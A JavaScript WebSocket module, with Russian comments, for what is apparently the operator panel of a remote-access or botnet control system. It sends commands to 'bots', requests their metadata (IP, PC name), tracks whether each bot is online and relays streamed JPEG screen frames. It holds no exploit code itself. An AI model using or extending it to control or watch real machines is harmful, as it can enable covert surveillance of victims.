/* frontend/client_control/js/modules/websocket/connection.js */
import { AppState } from '../core/states.js';
import { decodePacket, encodePacket, isJson } from '../../../../dashboard/js/modules/websocket/protocol.js';

let socket = null, botWatchdog = null;

const updateUI = (id, val) => {
    const el = document.getElementById(id);
    if (el && val) el.textContent = val;
};

const setOnline = (isOnline) => {
    const dot = document.getElementById('status-indicator');
    const txt = document.getElementById('status-text');
    dot?.classList.toggle('online', isOnline);
    if (txt) txt.textContent = isOnline ? 'online' : 'offline';
};

function handleIncomingData(buffer) {
    const pkg = decodePacket(buffer);
    if (!pkg || pkg.id !== AppState.clientId) return;

    if (isJson(pkg.module)) {
        try {
            const data = JSON.parse(new TextDecoder().decode(pkg.payload));

            // 1. Обновляем инфо, если она есть в пакете
            if (data.ip || data.id) {
                updateUI('display-id', data.id || pkg.id);
                updateUI('display-ip', data.ip);
            }

            // 2. Логика статуса:
            // Считаем бота онлайн, если пришел heartbeat ИЛИ пакет с данными (ответ на get_metadata)
            const isBotActive = data.net === 'heartbeat' || data.ip || data.pc_name;

            if (isBotActive) {
                setOnline(true);
                clearTimeout(botWatchdog);
                botWatchdog = setTimeout(() => setOnline(false), 10000);
            }

        } catch (e) { console.error("[WS] JSON Error"); }
    } else {
        // Бинарные данные (например, JPEG кадры стрима)
        window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
    }
}

export function initControlConnection() {
    const token = localStorage.getItem('auth_token'), login = localStorage.getItem('user_login');
    if (!token || !login) return;

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    // Параметр mode=control гарантирует, что сервер не пришлет старую БД
    const url = `${prot}//${location.host}/ws?token=${token}&login=${login}&mode=control`;

    socket = new WebSocket(url);
    socket.binaryType = 'arraybuffer';

    socket.onmessage = (e) => (e.data instanceof ArrayBuffer) && handleIncomingData(e.data);

    socket.onopen = () => {
        console.log("[WS] Connected. Requesting fresh metadata from bot...");
        // Прямой запрос боту (минуя БД сервера)
        window.sendToBot("DataScribe", "get_metadata");

        // Keep-alive для WebSocket сессии
        setInterval(() => socket?.readyState === 1 && socket.send(encodePacket("SERVER", "ping")), 25000);
    };

    socket.onclose = () => {
        setOnline(false);
        clearTimeout(botWatchdog);
    };

    window.sendToBot = (mod, pay) => {
        if (socket?.readyState === 1) {
            socket.send(encodePacket(AppState.clientId, mod, pay));
        }
    };
}